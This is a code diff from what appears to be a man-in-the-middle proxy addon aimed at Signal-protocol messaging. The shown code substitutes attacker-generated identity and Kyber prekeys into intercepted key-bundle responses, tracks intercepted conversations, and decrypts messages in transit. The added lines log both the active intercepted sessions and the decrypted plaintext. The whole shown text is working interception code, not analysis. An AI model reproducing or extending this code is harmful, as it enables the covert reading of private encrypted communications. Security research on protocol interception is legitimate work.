@@ -487,7 +487,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         except AssertionError:
             logging.error(f"Device ID is not greater than 0: {bob_bundle.device_id().get_id()}")
 
-        logging.warning(registration_info.keys())
+        logging.warning(f"registration infos: {registration_info.keys()}")
         # logging.warning(flow, ip_address)
         lastResortPq = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
             ip_address].pniData
@@ -556,8 +556,11 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             ]
         }
 
+        reg = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
+            ip_address].pniData
+
         lastResortPq = {
-            "keyId": lastResortPq["keyId"],
+            "keyId": reg.pq_lastResortKey.get("keyId", "42"),
             "publicKey": b64encode(fakeUser.last_resort_kyber.get_public().serialize()).decode(),
             "privateKey": fakeUser.last_resort_kyber.get_private().to_base64(),
         }
@@ -607,7 +610,8 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     # ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
     # logging.warning(f"session {ctx.options.conversation_session}")
     conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
-    # logging.warning(f"session {conversation_session}")
+    # 0logging.warning(f"session {conversation_session}")
+    logging.warning(f"active conversations: {conversation_session.keys()}")
 
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
     assert "privateKey" not in resp['devices'][0]['signedPreKey']
@@ -744,7 +748,8 @@ def _v1_ws_message(flow, identifier):
             pksm = protocol.PreKeySignalMessage.try_from(content)
             # logging.warning(f"PKSM> kyber: {pksm.message()}")
             try:
-                fakeUser.decrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), pksm)
+                dec = fakeUser.decrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), pksm)
+                logging.warning(f"DECRYPTION IS: {dec}")
             except Exception as e:
                 logging.warning(f"DECRYPTION FAILED: {e}\n\t{pksm}")
                 logging.warning(f"RAW content: {msg['content']}")
